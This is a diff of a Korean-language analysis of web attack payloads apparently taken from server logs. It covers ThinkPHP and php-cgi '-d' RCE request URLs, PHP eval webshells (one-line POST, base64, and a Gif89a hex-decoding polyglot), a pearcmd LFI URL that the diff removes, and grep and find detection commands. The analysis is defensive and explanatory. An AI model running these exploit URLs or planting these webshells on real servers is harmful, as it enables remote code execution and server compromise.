@@ -66,7 +66,6 @@ https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function
     ```
   * `<?php @eval($_POST['pwd']);?>` : 전형적인 POST-based 웹셸. 공격자가 이후 `POST`로 `pwd` 파라미터에 PHP 코드를 넣어 서버에서 실행하게 함.
   * `hello` : 흔히 쓰이는 “마커”(fingerprint) — 파일이 실제로 생성됐는지 확인하려는 식별자.
- 
 <br>
 
 ### 🐻‍❄️ 아래 페이로드도 임의 함수 호출(POC)
@@ -199,6 +198,8 @@ CGI 방식으로 PHP가 실행될 때 쿼리스트링에서 ini 설정을 허용
 
 ## 📎 예제 2-2. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)
 
+`-d` 옵션은 PHP 실행 시 ini 설정을 커맨드라인에서 덮어쓰는 옵션입니다. CGI 환경에서 취약하게 설정된 경우, 공격자는 **쿼리스트링으로 `-d` 옵션을 전달**해 런타임 ini 값을 변경할 수 있습니다. 
+
 ```
 https://www.e.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
 ```
@@ -224,8 +225,6 @@ https://www.we.net/php-cgi/php-cgi.exe?
 -d allow_url_include=1 
 -d auto_prepend_file=php://input
 ```
-
-`-d` 옵션은 PHP 실행 시 ini 설정을 커맨드라인에서 덮어쓰는 옵션입니다. CGI 환경에서 취약하게 설정된 경우, 공격자는 **쿼리스트링으로 `-d` 옵션을 전달**해 런타임 ini 값을 변경할 수 있습니다. 
 
 * `cgi.force_redirect=0` — 일부 보호 메커니즘을 비활성화해 직접 CGI 실행을 허용하게 함(취약 환경에서 필요).
 * `allow_url_include=1` — 원격 URL 포함 허용(위험).
@@ -276,7 +275,6 @@ https://www.we.net/php-cgi/php-cgi.exe?
    * `/api/hassio/app/../supervisor/info` 등은 내부 엔드포인트(정보 노출 가능)를 탐색하려는 시도.
    * `/setup/.../../../log.jsp`는 상위 디렉터리 접근을 통해 로그/설정 파일을 읽어보려는 시도(혹은 기존 취약점 유무 확인).
      
-
 
 ### RCE가 되는 경우 
 
@@ -382,34 +380,147 @@ create_function(post(2), post(3))
 
 ---
 
-## 📎 예제 4. 웹루트 php Stored WebShell 기반 웹 백도어 및 원격 쉘 공격
+## 📎 예제 4. Gif89a 헤더로 이미지 업로드를 우회한 웹쉘 생성
 
-#### (1)
-.php로 끝나는 경로에서, `eval(base64_decode($_POST[z0]))` 형태로 외부에서 전송한(base64로 인코딩된) 데이터를 디코딩 → `eval()`로 실행하겠다는 코드. 
+구체적으로는 `Gif89a`(GIF 헤더)로 업로드 검사 우회 후 `bbat.php` 파일을 생성하고, 그 안에서 POST로 전송한 16진수 데이터를 디코딩해 `eval()`로 실행하려는 전형적 웹쉘 패턴입니다.
 
+```
+@eval(,echo 'Gif89aMini<?php class _{
+    static public $phpcms\=null;
+    function __construct($l\=\"error\"){
+        self::$phpcms\=$l;
+        @eval(null.null.self::$phpcms);
+    }
+}
+function hexToStr($hex){
+    $str\=\"\";
+    for($i\=0;$i<strlen($hex)-1;$i \=2)
+        $str.\=chr(hexdec($hex[$i].$hex[$i 1]));
+    return $str;
+}
+$error\=null.hexToStr(@$_POST["cc"]);
+$d\=new _($error);
+?>' >bbat.php,)
+"){self::$phpcms\=$l;@eval(null.null.self::$phpcms)
+
+```
 
 ```php
-@eval(base64_decode($_POST['z0']));
+/* === 의도된(재구성) 구조 — 분석/방어용 (비실행) === */
+
+# 파일 앞부분에 GIF 헤더를 써서 업로드 검사를 우회하려는 의도
+// "Gif89a..." + "<?php ... ?>" 형태의 폴리글롯 파일 생성
+
+/* 생성될 PHP 코드의 핵심(의사 코드) */
+class WebShell {
+    static public $phpcms = null;
+
+    // 생성자에 전달된 문자열을 저장하고, eval로 실행하려는 구조
+    public function __construct($payload = "error") {
+        self::$phpcms = $payload;
+        /* 실제 공격은 아래처럼 실행함:
+           @eval(self::$phpcms);
+           ==> 원본 코드 실행 지점 (위험) */
+    }
+}
+
+/* 16진수(hex) 문자열을 문자로 복원하는 함수 (POST["cc"]로 전송된 데이터)
+   — 공격자는 이 부분에 인코딩된 PHP 코드를 넣어 서버가 디코드 후 실행하도록 함 */
+function hexToStr($hex) {
+    $str = "";
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+/* 실행 흐름(의도)
+   - $payload = hexToStr($_POST['cc']);
+   - new WebShell($payload);   // 생성자 내부에서 eval이 호출되어 payload 실행
+*/
+
+/* 결과 파일 예: bbat.php (앞에 GIF 헤더 포함) */
+/* ==> 업로드 폴더에 저장되면 웹에서 접근·실행 가능해짐 */
+
 ```
 
-* 동작: 공격자는 HTTP POST로 `z0`라는 매개변수에 **base64로 인코딩한 PHP 코드**를 보내고, 서버측은 이를 디코딩해서 `eval()`로 실행합니다.
-  * 예: POST body `z0=PD9waHAgc3lzdGVtKCd1bmFtZSAtYScpOyA/Pg==` (base64 디코딩하면 `<?php system('uname -a'); ?>`) → 서버가 이를 실행하면 `uname -a` 출력이 반환됩니다.
-* `@`는 에러 억제 연산자(경고/에러 감추기) — 탐지 어렵게 하려는 시도.
 
-<br>
 
-#### (2) LFI→RCE(파일 쓰기 또는 애플리케이션/유틸리티 오용) 익스플로잇 패턴 
-`pearcmd` 같은 로컬 유틸리티의 기능(파일 생성/설정 작성 등)을 오용하는 전형적 공격입니다.
+---
+
+# 3) 구성 요소와 의도된 동작 (분해)
+
+* `Gif89a` : GIF 파일 헤더(업로드 필터를 속이기 위한 표식).
+* `<?php ... ?>` : PHP 코드 삽입 — 서버가 PHP로 해석하면 원격명령 가능.
+* `class _ { ... }` : 웹쉘을 담을 클래스와 정적 변수 사용(난독화 목적).
+* `hexToStr()` : POST 파라미터(`cc`)로 받은 16진수 문자열을 문자로 복원하는 함수.
+* `@eval(...)` : 복원된 코드를 실행(핵심 위험 요소).
+* `' > bbat.php'` : 결과를 `bbat.php`로 저장하려는 쉘 리다이렉션 구문(문자열에 포함되어 있음).
+
+---
+
+# 4) 문법적·실제적 문제 — 왜 그대로는 실행되지 않을 가능성이 큰가
+
+원문에는 **여러 문법 오류와 전송 과정에서 생긴 변형**이 섞여 있어, 그대로 파이썬/쉘/PHP에서 실행되면 문법 에러가 납니다. 주요 문제:
+
+1. **이스케이프 문자(`\`)가 코드 안에 남아 있음**
+
+   * 예: `$phpcms\=null`, `$str\=\"\"` — PHP에서 `\=` 또는 `\"` 등은 문맥상 오류를 일으킵니다. (전송·로그 이스케이프 흔적)
+
+2. **연산자 누락/오타**
+
+   * `for(...;$i \=2)` — 의도는 `$i+=2` 또는 `$i = $i + 2`.
+   * `$hex[$i 1]` — 의도는 `$hex[$i+1]` (`+`가 빠짐).
+
+3. **잘못된 쉘/함수 조합**
+
+   * `@eval(,echo '...'>bbat.php,)` 같이 괄호·쉼표가 잘못 배치되어 있어 문법적으로 불완전.
+
+4. **일부 토큰 중복·잘림**
+
+   * 문자열 끝 부분이 중복되거나 잘려 있어 전체 흐름이 깨짐.
+
+> 결론: **지금 상태로는 문법 오류로 인해 그대로 실행될 가능성은 낮습니다.**
+> 하지만 전송/저장 과정에서 이스케이프가 제거되거나 공격자가 원본을 완성하면 실제 동작하는 웹쉘이 될 수 있으므로 조사가 필요합니다.
+
+---
+
+# 5) 성공했을 때의 위험(무엇을 할 수 있는가)
+
+* `bbat.php` 같은 웹쉘 파일 생성 → 외부에서 접속해 명령 실행 가능.
+* POST로 인코딩된 악성 PHP 코드를 전송하면 서버가 이를 실행.
+* 추가 파일 업로드, 데이터 유출, 지속성 확보 등 다양한 악행 가능.
+
+---
+
+# 6) 즉시 조사(포렌식) 체크리스트 — 우선 검사 항목
+
+1. **업로드 디렉터리에서 `bbat.php` 또는 최근 생성된 PHP 파일 확인**
+
+   ```bash
+   find /var/www -type f -name "bbat.php" -o -iname "*.php" -mtime -7
+   ```
+2. **업로드 폴더 내부에서 'GIF' 헤더와 `<?php`가 같이 포함된 파일 검색**
+
+   ```bash
+   grep -R --line-number -I -E "Gif8(9|7)a" /path/to/uploads 2>/dev/null
+   # 그리고 해당 파일에 '<?php' 존재 여부 확인
+   ```
+3. **웹서버 접근로그에서 해당 요청(업로드 시점)의 원격 IP / User-Agent 확인**
+4. **파일 내용에서 웹쉘 관련 문자열 검색**
+
+   ```bash
+   grep -R --line-number -E "hexToStr|chr\(hexdec|_\(.*\)|bbat\.php|\$_POST\[[\"']cc[\"']\]|ignore_user_abort|unlink\(__FILE__\)" /var/www 2>/dev/null
+   ```
+
+
+
+요점:
+
+* 공격자는 GIF 헤더(또는 이미지 허용 검사)를 이용해 `.php` 확장자가 아닌 파일로 업로드하거나, 내부에 GIF 헤더를 끼워 넣어 업로드 필터 우회.
+* 실제 실행은 `hexToStr($_POST["cc"])`로 전달된 16진수 페이로드를 `eval()`로 실행하는 지점에서 발생.
+* `class _` 와 정적 변수, 난독화(문자 결합 등)는 탐지를 회피하려는 수법.
+
 
 ```
-/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
-```
 
-
-* `lang=` 같은 파라미터를 통해 **경로(파일)를 포함(include)** 하도록 처리되는 취약점(LFI)을 노립니다(예: `include($_GET['lang'])`).
-* `../../.../usr/local/lib/php/pearcmd` 같은 경로는 시스템에 설치된 PEAR의 `pearcmd` 실행 스크립트(또는 유사 파일)를 가리킵니다.
-* 이어서 `&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php` 같은 추가 문자열은 pear 명령형 인터페이스를 통해 **파일 생성(config-create)** 을 호출해 `<?echo(md5("hi"));?>` 같은 PHP 코드를 **/tmp/index1.php** 에 쓰도록 시도하는 패턴입니다.
-* 결과적으로 공격자는 LFI를 통해 시스템의 다른 기능(pearcmd 등)을 포함/호출하여 **원격에서 임의 PHP 파일을 생성**(웹셸)하고, 그 파일에 접근해 임의 코드 실행(RCE)을 달성하려고 합니다.
-
-* 만들어진 `/tmp/index1.php`에 PHP 코드가 들어가면(예: `<?echo(md5("hi"));?>`) 웹에서 해당 파일을 호출하여 코드 실행(원격 명령/웹셸) 가능.
-* 공격자는 단순한 `md5("hi")` 테스트를 사용해 성공 여부 확인 후 더 위험한 코드(`system()`, `passthru()`, webshell 등)로 바꿀 수 있음.
